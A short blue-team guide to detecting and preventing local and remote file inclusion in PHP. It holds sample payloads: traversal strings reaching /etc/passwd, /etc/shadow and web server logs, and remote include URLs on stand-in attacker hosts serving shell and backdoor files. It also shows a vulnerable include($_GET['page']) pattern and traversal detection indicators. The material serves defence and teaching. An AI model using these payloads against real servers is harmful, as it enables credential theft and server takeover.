# Detecting RFI & LFI Attacks

## What Are LFI and RFI?

### LFI – Local File Inclusion
Attacker forces the application to include local server files.

Example target:
- /etc/passwd
- Windows system files
- Application configuration files

---

### RFI – Remote File Inclusion
Attacker forces the application to include a remote file  
hosted on an external server.

More dangerous because:
- Can lead to Remote Code Execution (RCE)

---

# How Inclusion Vulnerabilities Happen

Common vulnerable pattern (conceptual):

include($_GET['page']);

If attacker controls "page" parameter →  
they may include arbitrary files.

---

# Common Attack Payloads

## LFI Payloads

../../../etc/passwd  
../../../../windows/win.ini  
/etc/shadow  

Log poisoning attempts:
../../../../var/log/apache2/access.log  

---

## RFI Payloads

http://attacker.com/shell.txt  
https://evil-site.com/backdoor.php  

May use:
- URL encoding
- Double encoding
- Null byte injection (older systems)

---

# Detection Indicators (Blue Team)

## 1. Suspicious URL Patterns

Look for:
- ../
- ..%2f
- %2e%2e%2f
- /etc/passwd
- win.ini
- http:// in parameters

Example suspicious request:

GET /index.php?page=../../../../etc/passwd

---

## 2. Access Log Clues

- Repeated directory traversal attempts
- Requests with long traversal chains
- Requests containing external URLs in parameters
- High number of 500 errors after inclusion attempts

---

## 3. Process Behavior

For RFI:
- Web server making outbound HTTP requests unexpectedly
- Suspicious child processes (bash, sh, cmd.exe)
- Unknown PHP processes spawned

---

## 4. File Access Monitoring

Unexpected access to:
- System files
- Log files
- Configuration files

---

# Impact

LFI may lead to:
- Sensitive file disclosure
- Credential exposure
- Log poisoning → RCE

RFI may lead to:
- Remote code execution
- Full server compromise
- Web shell installation

---

# Prevention

## 1. Whitelist Allowed Files
Never allow user-controlled file paths directly.

## 2. Disable Remote File Inclusion
In PHP:
allow_url_include = Off

## 3. Input Validation
Reject:
- ../
- Absolute paths
- External URLs

## 4. Use Secure Framework Routing
Avoid manual include() based on user input.

## 5. Least Privilege
Limit file system access for web server user.